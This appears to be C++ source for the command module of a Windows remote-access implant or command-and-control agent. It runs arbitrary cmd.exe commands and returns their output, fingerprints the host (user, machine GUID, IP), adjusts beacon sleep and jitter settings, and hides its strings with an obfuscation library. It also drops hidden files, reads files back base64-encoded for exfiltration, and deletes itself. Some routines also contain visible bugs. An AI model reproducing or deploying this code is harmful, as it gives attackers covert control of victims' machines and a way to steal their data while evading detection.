#include <windows.h>
#include <winsock.h>
#include <compressapi.h>
#include "command.h"
#include "debug.h"
#include "profile.h"
#include <shlwapi.h>
#include "crypto.h"
#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/stringbuffer.h"
#include "obfuscator/MetaString.h"
using namespace andrivet::ADVobfuscator;


LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut) {
    // szCmdLine should fit in cmd.exe /c <szCmdLine>
    DEBUG_PRINTF("Executing command: %s\n", szCmdline);
    SECURITY_ATTRIBUTES saAttr;
    HANDLE hPipeRead, hPipeWrite;
    BYTE buffer[4096];
    DWORD dwRead, dwWritten;
    LPBYTE outputBuffer = NULL;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        DEBUG_PRINTF("Error creating pipe: %d\n", GetLastError());
        return NULL;
    }

    STARTUPINFO siStartInfo;
    PROCESS_INFORMATION piProcInfo;

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hPipeWrite;
    siStartInfo.hStdOutput = hPipeWrite;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Set up full command line
    // cmd.exe /c <szCmdLine>
    char fullCmdLine[4096];
    strcpy(fullCmdLine, OBFUSCATED("cmd.exe /c "));
    strcat(fullCmdLine, szCmdline);

    if (!CreateProcess(NULL, (LPSTR)fullCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
        DEBUG_PRINTF("Error creating process: %d\n", GetLastError());
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        return NULL;
    }

    CloseHandle(hPipeWrite);

    do {
        if (!ReadFile(hPipeRead, buffer, sizeof(buffer), &dwRead, NULL) || dwRead == 0) break;
        outputBuffer = (LPBYTE)realloc(outputBuffer, *stOut + dwRead);
        if (outputBuffer == NULL) {
            DEBUG_PRINTF("Error allocating memory\n");
            CloseHandle(hPipeRead);
            return NULL;
        }
        memcpy(outputBuffer + *stOut, buffer, dwRead);
        *stOut += dwRead;
    } while (true);

    CloseHandle(hPipeRead);
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

    return outputBuffer;
}

LPBYTE ExecuteCmdArgVector(std::vector<std::string> args, PSIZE_T outSize)
{
    std::string cmdLine = "";
    for (auto arg : args) {
        cmdLine += arg + " ";
    }
    return ExecuteCmd(cmdLine.c_str(), outSize);
}

/**
 * Stop this process and remove it from the system
*/
void SelfDestruct()
{
    // get file path, if applicable
    char filePath[MAX_PATH];
    GetModuleFileName(NULL, filePath, MAX_PATH);

    // delete file
    DEBUG_PRINTF("Deleting file: %s\n", filePath);
    DeleteFile(filePath);

    // get process handle
    HANDLE hProcess = GetCurrentProcess();

    // terminate process
    TerminateProcess(hProcess, 0);

    // close process handle
    CloseHandle(hProcess);

    // exit
    exit(0);

}

/**
 * Get basic system information about this system
*/
std::string SysInfo()
{

    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameA(computerName, &size);

    // Get username
    char userName[4096];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    GetUserName(userName, &userNameSize);


    // Get OS version
    OSVERSIONINFOEX osInfo;
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO)&osInfo);

    // Get system info
    SYSTEM_INFO sysInfo;
    ZeroMemory(&sysInfo, sizeof(SYSTEM_INFO));
    GetSystemInfo(&sysInfo);

    // Get machine GUID from Registry
    HKEY hKey;
    char guid[256];
    DWORD guidSize = sizeof(guid);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, OBFUSCATED("SOFTWARE\\Microsoft\\Cryptography"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        RegQueryValueEx(hKey, OBFUSCATED("MachineGuid"), NULL, NULL, (LPBYTE)&guid, &guidSize);
        RegCloseKey(hKey);
    }

    // Get private IP
    char hostName[256];
    gethostname(hostName, sizeof(hostName));
    hostent* host = gethostbyname(hostName);
    char* ip = inet_ntoa(*(struct in_addr*)*host->h_addr_list);

    rapidjson::Document results;
    results.SetObject();
    rapidjson::Document::AllocatorType& allocator = results.GetAllocator();

    results.AddMember("computerName", rapidjson::Value(computerName, allocator), allocator);
    results.AddMember("userName", rapidjson::Value(userName, allocator), allocator);
    results.AddMember("osVersion", rapidjson::Value((unsigned int)osInfo.dwMajorVersion), allocator);
    results.AddMember("osBuild", rapidjson::Value((unsigned int)osInfo.dwBuildNumber), allocator);
    results.AddMember("osPlatform", rapidjson::Value((unsigned int)sysInfo.wProcessorArchitecture), allocator);
    results.AddMember("numProcessors", rapidjson::Value((unsigned int)sysInfo.dwNumberOfProcessors), allocator);
    results.AddMember("machineGuid", rapidjson::Value(guid, allocator), allocator);
    results.AddMember("privateIp", rapidjson::Value(ip, allocator), allocator);

    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    results.Accept(writer);

    return buffer.GetString();

}


void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile) {
    rapidjson::Value::ConstMemberIterator itr = changes->MemberBegin();
    for (; itr != changes->MemberEnd(); ++itr) {
        if (itr->name == OBFUSCATED("sleep_time")) {
            currentProfile->sleep = itr->value.GetInt();
        }
        else if (itr->name == OBFUSCATED("user_agent")) {
            currentProfile->userAgent = itr->value.GetString();
        }
        else if (itr->name == OBFUSCATED("jitter")) {
            currentProfile->jitter = itr->value.GetFloat();
        }
        else if (itr->name == OBFUSCATED("max_retries")) {
            currentProfile->maxRetries = itr->value.GetInt();
        }
        else if (itr->name == OBFUSCATED("auto_self_destruct")) {
            currentProfile->autoSelfDestruct = itr->value.GetBool();
        }
        else if (itr->name == OBFUSCATED("retry_wait")) {
            currentProfile->retryWait = itr->value.GetInt();
        }
        else if (itr->name == OBFUSCATED("retry_jitter")) {
            currentProfile->retryJitter = itr->value.GetFloat();
        }
        else if (itr->name == OBFUSCATED("tailoring_hashes")) {
            currentProfile->tailoringHashes = std::vector<std::string>();
            for (auto& hash : itr->value.GetArray()) {
                currentProfile->tailoringHashes.push_back(hash.GetString());
            }
        }
        else if (itr->name == OBFUSCATED("tailoring_hash_function")) {
            std::string hashFunction = itr->value.GetString();
            if (!(hashFunction == OBFUSCATED("sha256") || hashFunction == OBFUSCATED("md5"))) {
                DEBUG_PRINTF("Invalid hash function: %s\n", hashFunction.c_str());
            }
            else {
                currentProfile->tailoringHashFunction = hashFunction;
            }
        }
        else if (itr->name == OBFUSCATED("tailoring_hash_rounds")) {
            currentProfile->tailoringHashRounds = itr->value.GetInt();
        }
    }
}

std::string Upload(rapidjson::Value* uploaded) {
    CHAR path [200];
    CHAR fullPath [200];
    std::string fileName;
	std::string b64Contents;
    rapidjson::Value::ConstMemberIterator itr = uploaded->MemberBegin();
    for (; itr != uploaded->MemberEnd(); ++itr) {
        if (itr->name == OBFUSCATED("name")) {
            fileName = itr->value.GetString();
        } else if (itr->name == OBFUSCATED("contents")) {
            b64Contents = itr->value.GetString();
        }
    }
    std::vector<BYTE> bytes = base64Decode(b64Contents);
    GetTempPathA(80, path);
    PathCombineA(fullPath, path, fileName.c_str());
    HANDLE hFile = CreateFileA(fullPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return "ERROR";
    }

    PSIZE_T out_size;

    if (WriteFile(hFile, &bytes.at(0), sizeof(BYTE) * bytes.size(), NULL, NULL) == 0) {
        return "ERROR";
    }
    return fileName;
}

std::string Download(std::string filepath) {
    DWORD file_attr = GetFileAttributesA(filepath.c_str());

    if (file_attr == INVALID_FILE_ATTRIBUTES) {
        return "ERROR";
    }
    if (file_attr & FILE_ATTRIBUTE_DIRECTORY) {
        return "DIR";
    }
    HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return "ERROR";
    }

    LARGE_INTEGER size;
    DWORD lower = GetFileSizeEx(hFile, &size);
    if (size.QuadPart >= 4 * 1024 * 1024 * 1024) {
        return "TOO BIG";
    }
    void* raw_buffer = malloc(size.QuadPart);
    if (raw_buffer == NULL) {
        return "ERROR";
    }
    memset(raw_buffer, 0, size.QuadPart);
    DWORD bytes_read;
    if (ReadFile(hFile, raw_buffer, size.QuadPart, &bytes_read, NULL) == 0) {
        return "ERROR";
    }
    std::vector<BYTE> vec;
    vec.reserve(bytes_read);
    vec.assign(raw_buffer, raw_buffer + bytes_read);
    return base64Encode(vec);
}